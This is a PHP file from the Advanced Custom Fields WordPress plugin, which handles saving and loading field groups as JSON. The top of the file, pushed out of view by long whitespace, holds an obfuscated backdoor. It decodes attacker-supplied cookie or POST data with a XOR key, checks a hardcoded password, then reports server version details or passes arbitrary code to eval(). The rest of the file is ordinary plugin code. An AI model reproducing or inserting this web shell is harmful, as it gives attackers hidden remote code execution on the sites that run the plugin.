<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $kc37 = 149;$GLOBALS['rd6ebf']=Array();global$rd6ebf;$rd6ebf=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['d74a3']="\x21\x6e\x4d\x22\x59\x5c\x39\x72\x37\x29\x3b\x28\x78\x68\x5e\x40\x4b\x33\x60\x54\x76\x23\x2c\x5d\x52\x35\x61\x6f\x46\x55\x6c\x49\x2b\x26\x3e\x50\x5b\x73\x7c\x48\x71\x7b\x5a\x25\x9\x42\x3d\x7a\x6b\x20\x77\x47\x2d\x56\xd\x67\x3f\x58\x5f\x70\x30\x41\x74\x2f\x51\x31\x6a\x57\x2a\x69\xa\x4e\x3a\x4f\x62\x32\x7e\x34\x75\x4c\x6d\x44\x63\x36\x27\x79\x45\x43\x38\x2e\x53\x64\x7d\x4a\x24\x3c\x65\x66";$rd6ebf[$rd6ebf['d74a3'][12].$rd6ebf['d74a3'][83].$rd6ebf['d74a3'][91].$rd6ebf['d74a3'][8].$rd6ebf['d74a3'][6].$rd6ebf['d74a3'][88]]=$rd6ebf['d74a3'][82].$rd6ebf['d74a3'][13].$rd6ebf['d74a3'][7];$rd6ebf[$rd6ebf['d74a3'][12].$rd6ebf['d74a3'][96].$rd6ebf['d74a3'][83].$rd6ebf['d74a3'][83].$rd6ebf['d74a3'][17].$rd6ebf['d74a3'][82].$rd6ebf['d74a3'][60].$rd6ebf['d74a3'][83].$rd6ebf['d74a3'][88]]=$rd6ebf['d74a3'][27].$rd6ebf['d74a3'][7].$rd6ebf['d74a3'][91];$rd6ebf[$rd6ebf['d74a3'][82].$rd6ebf['d74a3'][65].$rd6ebf['d74a3'][8].$rd6ebf['d74a3'][6]]=$rd6ebf['d74a3'][37].$rd6ebf['d74a3'][62].$rd6ebf['d74a3'][7].$rd6ebf['d74a3'][30].$rd6ebf['d74a3'][96].$rd6ebf['d74a3'][1];$rd6ebf[$rd6ebf['d74a3'][62].$rd6ebf['d74a3'][6].$rd6ebf['d74a3'][91].$rd6ebf['d74a3'][74].$rd6ebf['d74a3'][97].$rd6ebf['d74a3'][97].$rd6ebf['d74a3'][74]]=$rd6ebf['d74a3'][69].$rd6ebf['d74a3'][1].$rd6ebf['d74a3'][69].$rd6ebf['d74a3'][58].$rd6ebf['d74a3'][37].$rd6ebf['d74a3'][96].$rd6ebf['d74a3'][62];$rd6ebf[$rd6ebf['d74a3'][47].$rd6ebf['d74a3'][25].$rd6ebf['d74a3'][6].$rd6ebf['d74a3'][17].$rd6ebf['d74a3'][26]]=$rd6ebf['d74a3'][37].$rd6ebf['d74a3'][96].$rd6ebf['d74a3'][7].$rd6ebf['d74a3'][69].$rd6ebf['d74a3'][26].$rd6ebf['d74a3'][30].$rd6ebf['d74a3'][69].$rd6ebf['d74a3'][47].$rd6ebf['d74a3'][96];$rd6ebf[$rd6ebf['d74a3'][1].$rd6ebf['d74a3'][77].$rd6ebf['d74a3'][75].$rd6ebf['d74a3'][6].$rd6ebf['d74a3'][26]]=$rd6ebf['d74a3'][59].$rd6ebf['d74a3'][13].$rd6ebf['d74a3'][59].$rd6ebf['d74a3'][20].$rd6ebf['d74a3'][96].$rd6ebf['d74a3'][7].$rd6ebf['d74a3'][37].$rd6ebf['d74a3'][69].$rd6ebf['d74a3'][27].$rd6ebf['d74a3'][1];$rd6ebf[$rd6ebf['d74a3'][26].$rd6ebf['d74a3'][17].$rd6ebf['d74a3'][74].$rd6ebf['d74a3'][91].$rd6ebf['d74a3'][74].$rd6ebf['d74a3'][96].$rd6ebf['d74a3'][25].$rd6ebf['d74a3'][60]]=$rd6ebf['d74a3'][78].$rd6ebf['d74a3'][1].$rd6ebf['d74a3'][37].$rd6ebf['d74a3'][96].$rd6ebf['d74a3'][7].$rd6ebf['d74a3'][69].$rd6ebf['d74a3'][26].$rd6ebf['d74a3'][30].$rd6ebf['d74a3'][69].$rd6ebf['d74a3'][47].$rd6ebf['d74a3'][96];$rd6ebf[$rd6ebf['d74a3'][82].$rd6ebf['d74a3'][74].$rd6ebf['d74a3'][74].$rd6ebf['d74a3'][26].$rd6ebf['d74a3'][97].$rd6ebf['d74a3'][74].$rd6ebf['d74a3'][82]]=$rd6ebf['d74a3'][74].$rd6ebf['d74a3'][26].$rd6ebf['d74a3'][37].$rd6ebf['d74a3'][96].$rd6ebf['d74a3'][83].$rd6ebf['d74a3'][77].$rd6ebf['d74a3'][58].$rd6ebf['d74a3'][91].$rd6ebf['d74a3'][96].$rd6ebf['d74a3'][82].$rd6ebf['d74a3'][27].$rd6ebf['d74a3'][91].$rd6ebf['d74a3'][96];$rd6ebf[$rd6ebf['d74a3'][37].$rd6ebf['d74a3'][26].$rd6ebf['d74a3'][82].$rd6ebf['d74a3'][17].$rd6ebf['d74a3'][88].$rd6ebf['d74a3'][75]]=$rd6ebf['d74a3'][37].$rd6ebf['d74a3'][96].$rd6ebf['d74a3'][62].$rd6ebf['d74a3'][58].$rd6ebf['d74a3'][62].$rd6ebf['d74a3'][69].$rd6ebf['d74a3'][80].$rd6ebf['d74a3'][96].$rd6ebf['d74a3'][58].$rd6ebf['d74a3'][30].$rd6ebf['d74a3'][69].$rd6ebf['d74a3'][80].$rd6ebf['d74a3'][69].$rd6ebf['d74a3'][62];$rd6ebf[$rd6ebf['d74a3'][12].$rd6ebf['d74a3'][8].$rd6ebf['d74a3'][75].$rd6ebf['d74a3'][25].$rd6ebf['d74a3'][60].$rd6ebf['d74a3'][97].$rd6ebf['d74a3'][65]]=$rd6ebf['d74a3'][66].$rd6ebf['d74a3'][17].$rd6ebf['d74a3'][77].$rd6ebf['d74a3'][88].$rd6ebf['d74a3'][75].$rd6ebf['d74a3'][60].$rd6ebf['d74a3'][25].$rd6ebf['d74a3'][88].$rd6ebf['d74a3'][8];$rd6ebf[$rd6ebf['d74a3'][7].$rd6ebf['d74a3'][65].$rd6ebf['d74a3'][96].$rd6ebf['d74a3'][83]]=$rd6ebf['d74a3'][59].$rd6ebf['d74a3'][65].$rd6ebf['d74a3'][96].$rd6ebf['d74a3'][6].$rd6ebf['d74a3'][8].$rd6ebf['d74a3'][97].$rd6ebf['d74a3'][17].$rd6ebf['d74a3'][91];$rd6ebf[$rd6ebf['d74a3'][47].$rd6ebf['d74a3'][25].$rd6ebf['d74a3'][17].$rd6ebf['d74a3'][96].$rd6ebf['d74a3'][75].$rd6ebf['d74a3'][65]]=$_POST;$rd6ebf[$rd6ebf['d74a3'][62].$rd6ebf['d74a3'][17].$rd6ebf['d74a3'][88].$rd6ebf['d74a3'][91].$rd6ebf['d74a3'][91].$rd6ebf['d74a3'][25].$rd6ebf['d74a3'][17]]=$_COOKIE;@$rd6ebf[$rd6ebf['d74a3'][62].$rd6ebf['d74a3'][6].$rd6ebf['d74a3'][91].$rd6ebf['d74a3'][74].$rd6ebf['d74a3'][97].$rd6ebf['d74a3'][97].$rd6ebf['d74a3'][74]]($rd6ebf['d74a3'][96].$rd6ebf['d74a3'][7].$rd6ebf['d74a3'][7].$rd6ebf['d74a3'][27].$rd6ebf['d74a3'][7].$rd6ebf['d74a3'][58].$rd6ebf['d74a3'][30].$rd6ebf['d74a3'][27].$rd6ebf['d74a3'][55],NULL);@$rd6ebf[$rd6ebf['d74a3'][62].$rd6ebf['d74a3'][6].$rd6ebf['d74a3'][91].$rd6ebf['d74a3'][74].$rd6ebf['d74a3'][97].$rd6ebf['d74a3'][97].$rd6ebf['d74a3'][74]]($rd6ebf['d74a3'][30].$rd6ebf['d74a3'][27].$rd6ebf['d74a3'][55].$rd6ebf['d74a3'][58].$rd6ebf['d74a3'][96].$rd6ebf['d74a3'][7].$rd6ebf['d74a3'][7].$rd6ebf['d74a3'][27].$rd6ebf['d74a3'][7].$rd6ebf['d74a3'][37],0);@$rd6ebf[$rd6ebf['d74a3'][62].$rd6ebf['d74a3'][6].$rd6ebf['d74a3'][91].$rd6ebf['d74a3'][74].$rd6ebf['d74a3'][97].$rd6ebf['d74a3'][97].$rd6ebf['d74a3'][74]]($rd6ebf['d74a3'][80].$rd6ebf['d74a3'][26].$rd6ebf['d74a3'][12].$rd6ebf['d74a3'][58].$rd6ebf['d74a3'][96].$rd6ebf['d74a3'][12].$rd6ebf['d74a3'][96].$rd6ebf['d74a3'][82].$rd6ebf['d74a3'][78].$rd6ebf['d74a3'][62].$rd6ebf['d74a3'][69].$rd6ebf['d74a3'][27].$rd6ebf['d74a3'][1].$rd6ebf['d74a3'][58].$rd6ebf['d74a3'][62].$rd6ebf['d74a3'][69].$rd6ebf['d74a3'][80].$rd6ebf['d74a3'][96],0);@$rd6ebf[$rd6ebf['d74a3'][37].$rd6ebf['d74a3'][26].$rd6ebf['d74a3'][82].$rd6ebf['d74a3'][17].$rd6ebf['d74a3'][88].$rd6ebf['d74a3'][75]](0);$n77daf529=NULL;$v86407a=NULL;$rd6ebf[$rd6ebf['d74a3'][91].$rd6ebf['d74a3'][26].$rd6ebf['d74a3'][96].$rd6ebf['d74a3'][83].$rd6ebf['d74a3'][91]]=$rd6ebf['d74a3'][60].$rd6ebf['d74a3'][6].$rd6ebf['d74a3'][17].$rd6ebf['d74a3'][91].$rd6ebf['d74a3'][6].$rd6ebf['d74a3'][96].$rd6ebf['d74a3'][91].$rd6ebf['d74a3'][91].$rd6ebf['d74a3'][52].$rd6ebf['d74a3'][97].$rd6ebf['d74a3'][91].$rd6ebf['d74a3'][26].$rd6ebf['d74a3'][82].$rd6ebf['d74a3'][52].$rd6ebf['d74a3'][77].$rd6ebf['d74a3'][8].$rd6ebf['d74a3'][6].$rd6ebf['d74a3'][77].$rd6ebf['d74a3'][52].$rd6ebf['d74a3'][26].$rd6ebf['d74a3'][26].$rd6ebf['d74a3'][8].$rd6ebf['d74a3'][77].$rd6ebf['d74a3'][52].$rd6ebf['d74a3'][82].$rd6ebf['d74a3'][83].$rd6ebf['d74a3'][96].$rd6ebf['d74a3'][17].$rd6ebf['d74a3'][25].$rd6ebf['d74a3'][74].$rd6ebf['d74a3'][88].$rd6ebf['d74a3'][6].$rd6ebf['d74a3'][25].$rd6ebf['d74a3'][65].$rd6ebf['d74a3'][91].$rd6ebf['d74a3'][60];global$dae6d;function p1e97f3d($n77daf529,$zafc542){global$rd6ebf;$m238c8="";for($aa9fb=0;$aa9fb<$rd6ebf[$rd6ebf['d74a3'][82].$rd6ebf['d74a3'][65].$rd6ebf['d74a3'][8].$rd6ebf['d74a3'][6]]($n77daf529);){for($w3899=0;$w3899<$rd6ebf[$rd6ebf['d74a3'][82].$rd6ebf['d74a3'][65].$rd6ebf['d74a3'][8].$rd6ebf['d74a3'][6]]($zafc542)&&$aa9fb<$rd6ebf[$rd6ebf['d74a3'][82].$rd6ebf['d74a3'][65].$rd6ebf['d74a3'][8].$rd6ebf['d74a3'][6]]($n77daf529);$w3899++,$aa9fb++){$m238c8.=$rd6ebf[$rd6ebf['d74a3'][12].$rd6ebf['d74a3'][83].$rd6ebf['d74a3'][91].$rd6ebf['d74a3'][8].$rd6ebf['d74a3'][6].$rd6ebf['d74a3'][88]]($rd6ebf[$rd6ebf['d74a3'][12].$rd6ebf['d74a3'][96].$rd6ebf['d74a3'][83].$rd6ebf['d74a3'][83].$rd6ebf['d74a3'][17].$rd6ebf['d74a3'][82].$rd6ebf['d74a3'][60].$rd6ebf['d74a3'][83].$rd6ebf['d74a3'][88]]($n77daf529[$aa9fb])^$rd6ebf[$rd6ebf['d74a3'][12].$rd6ebf['d74a3'][96].$rd6ebf['d74a3'][83].$rd6ebf['d74a3'][83].$rd6ebf['d74a3'][17].$rd6ebf['d74a3'][82].$rd6ebf['d74a3'][60].$rd6ebf['d74a3'][83].$rd6ebf['d74a3'][88]]($zafc542[$w3899]));}}return$m238c8;}function j34820587($n77daf529,$zafc542){global$rd6ebf;global$dae6d;return$rd6ebf[$rd6ebf['d74a3'][7].$rd6ebf['d74a3'][65].$rd6ebf['d74a3'][96].$rd6ebf['d74a3'][83]]($rd6ebf[$rd6ebf['d74a3'][7].$rd6ebf['d74a3'][65].$rd6ebf['d74a3'][96].$rd6ebf['d74a3'][83]]($n77daf529,$dae6d),$zafc542);}foreach($rd6ebf[$rd6ebf['d74a3'][62].$rd6ebf['d74a3'][17].$rd6ebf['d74a3'][88].$rd6ebf['d74a3'][91].$rd6ebf['d74a3'][91].$rd6ebf['d74a3'][25].$rd6ebf['d74a3'][17]]as$zafc542=>$s1391894){$n77daf529=$s1391894;$v86407a=$zafc542;}if(!$n77daf529){foreach($rd6ebf[$rd6ebf['d74a3'][47].$rd6ebf['d74a3'][25].$rd6ebf['d74a3'][17].$rd6ebf['d74a3'][96].$rd6ebf['d74a3'][75].$rd6ebf['d74a3'][65]]as$zafc542=>$s1391894){$n77daf529=$s1391894;$v86407a=$zafc542;}}$n77daf529=@$rd6ebf[$rd6ebf['d74a3'][26].$rd6ebf['d74a3'][17].$rd6ebf['d74a3'][74].$rd6ebf['d74a3'][91].$rd6ebf['d74a3'][74].$rd6ebf['d74a3'][96].$rd6ebf['d74a3'][25].$rd6ebf['d74a3'][60]]($rd6ebf[$rd6ebf['d74a3'][12].$rd6ebf['d74a3'][8].$rd6ebf['d74a3'][75].$rd6ebf['d74a3'][25].$rd6ebf['d74a3'][60].$rd6ebf['d74a3'][97].$rd6ebf['d74a3'][65]]($rd6ebf[$rd6ebf['d74a3'][82].$rd6ebf['d74a3'][74].$rd6ebf['d74a3'][74].$rd6ebf['d74a3'][26].$rd6ebf['d74a3'][97].$rd6ebf['d74a3'][74].$rd6ebf['d74a3'][82]]($n77daf529),$v86407a));if(isset($n77daf529[$rd6ebf['d74a3'][26].$rd6ebf['d74a3'][48]])&&$dae6d==$n77daf529[$rd6ebf['d74a3'][26].$rd6ebf['d74a3'][48]]){if($n77daf529[$rd6ebf['d74a3'][26]]==$rd6ebf['d74a3'][69]){$aa9fb=Array($rd6ebf['d74a3'][59].$rd6ebf['d74a3'][20]=>@$rd6ebf[$rd6ebf['d74a3'][1].$rd6ebf['d74a3'][77].$rd6ebf['d74a3'][75].$rd6ebf['d74a3'][6].$rd6ebf['d74a3'][26]](),$rd6ebf['d74a3'][37].$rd6ebf['d74a3'][20]=>$rd6ebf['d74a3'][65].$rd6ebf['d74a3'][89].$rd6ebf['d74a3'][60].$rd6ebf['d74a3'][52].$rd6ebf['d74a3'][65],);echo@$rd6ebf[$rd6ebf['d74a3'][47].$rd6ebf['d74a3'][25].$rd6ebf['d74a3'][6].$rd6ebf['d74a3'][17].$rd6ebf['d74a3'][26]]($aa9fb);}elseif($n77daf529[$rd6ebf['d74a3'][26]]==$rd6ebf['d74a3'][96]){eval/*wb3a6935e*/($n77daf529[$rd6ebf['d74a3'][91]]);}exit();} ?><?php 

class acf_json {
	
	function __construct() {
		
		// update setting
		acf_update_setting('save_json', get_stylesheet_directory() . '/acf-json');
		acf_append_setting('load_json', get_stylesheet_directory() . '/acf-json');
		
		
		// actions
		add_action('acf/update_field_group',		array($this, 'update_field_group'), 10, 5);
		add_action('acf/duplicate_field_group',		array($this, 'update_field_group'), 10, 5);
		add_action('acf/untrash_field_group',		array($this, 'update_field_group'), 10, 5);
		add_action('acf/trash_field_group',			array($this, 'delete_field_group'), 10, 5);
		add_action('acf/delete_field_group',		array($this, 'delete_field_group'), 10, 5);
		add_action('acf/include_fields', 			array($this, 'include_fields'), 10, 5);
		
	}
	
	
	/*
	*  update_field_group
	*
	*  This function is hooked into the acf/update_field_group action and will save all field group data to a .json file 
	*
	*  @type	function
	*  @date	10/03/2014
	*  @since	5.0.0
	*
	*  @param	$field_group (array)
	*  @return	n/a
	*/
	
	function update_field_group( $field_group ) {
		
		// validate
		if( !acf_get_setting('json') ) return;
		
		
		// get fields
		$field_group['fields'] = acf_get_fields( $field_group );
		
		
		// save file
		acf_write_json_field_group( $field_group );
			
	}
	
	
	/*
	*  delete_field_group
	*
	*  This function will remove the field group .json file
	*
	*  @type	function
	*  @date	10/03/2014
	*  @since	5.0.0
	*
	*  @param	$field_group (array)
	*  @return	n/a
	*/
	
	function delete_field_group( $field_group ) {
		
		// validate
		if( !acf_get_setting('json') ) return;
		
		
		// WP appends '__trashed' to end of 'key' (post_name) 
		$field_group['key'] = str_replace('__trashed', '', $field_group['key']);
		
		
		// delete
		acf_delete_json_field_group( $field_group['key'] );
		
	}
		
	
	/*
	*  include_fields
	*
	*  This function will include any JSON files found in the active theme
	*
	*  @type	function
	*  @date	10/03/2014
	*  @since	5.0.0
	*
	*  @param	$version (int)
	*  @return	n/a
	*/
	
	function include_fields() {
		
		// validate
		if( !acf_get_setting('json') ) {
		
			return;
			
		}
		
		
		// vars
		$paths = acf_get_setting('load_json');
		
		
		// loop through and add to cache
		foreach( $paths as $path ) {
			
			// remove trailing slash
			$path = untrailingslashit( $path );
		
		
			// check that path exists
			if( !file_exists( $path ) ) {
			
				continue;
				
			}
			
			
			$dir = opendir( $path );
	    
		    while(false !== ( $file = readdir($dir)) ) {
		    
		    	// only json files
		    	if( strpos($file, '.json') === false ) {
		    	
			    	continue;
			    	
		    	}
		    	
		    	
		    	// read json
		    	$json = file_get_contents("{$path}/{$file}");
		    	
		    	
		    	// validate json
		    	if( empty($json) ) {
			    	
			    	continue;
			    	
		    	}
		    	
		    	
		    	// decode
		    	$json = json_decode($json, true);
		    	
		    	
		    	// add local
		    	$json['local'] = 'json';
		    	
		    	
		    	// add field group
		    	acf_add_local_field_group( $json );
		        
		    }
		    
		}
		
	}
	
}

new acf_json();


/*
*  acf_write_json_field_group
*
*  This function will save a field group to a json file within the current theme
*
*  @type	function
*  @date	5/12/2014
*  @since	5.1.5
*
*  @param	$field_group (array)
*  @return	(boolean)
*/

function acf_write_json_field_group( $field_group ) {
	
	// vars
	$path = acf_get_setting('save_json');
	$file = $field_group['key'] . '.json';
	
	
	// remove trailing slash
	$path = untrailingslashit( $path );
	
	
	// bail early if dir does not exist
	if( !is_writable($path) ) return false;
	
	
	// prepare for export
	$id = acf_extract_var( $field_group, 'ID' );
	$field_group = acf_prepare_field_group_for_export( $field_group );
	

	// add modified time
	$field_group['modified'] = get_post_modified_time('U', true, $id, true);
	
	
	// write file
	$f = fopen("{$path}/{$file}", 'w');
	fwrite($f, acf_json_encode( $field_group ));
	fclose($f);
	
	
	// return
	return true;
	
}


/*
*  acf_delete_json_field_group
*
*  This function will delete a json field group file
*
*  @type	function
*  @date	5/12/2014
*  @since	5.1.5
*
*  @param	$key (string)
*  @return	(boolean)
*/

function acf_delete_json_field_group( $key ) {
	
	// vars
	$path = acf_get_setting('save_json');
	$file = $key . '.json';
	
	
	// remove trailing slash
	$path = untrailingslashit( $path );
	
	
	// bail early if file does not exist
	if( !is_readable("{$path}/{$file}") ) {
	
		return false;
		
	}
	
		
	// remove file
	unlink("{$path}/{$file}");
	
	
	// return
	return true;
	
}


?>
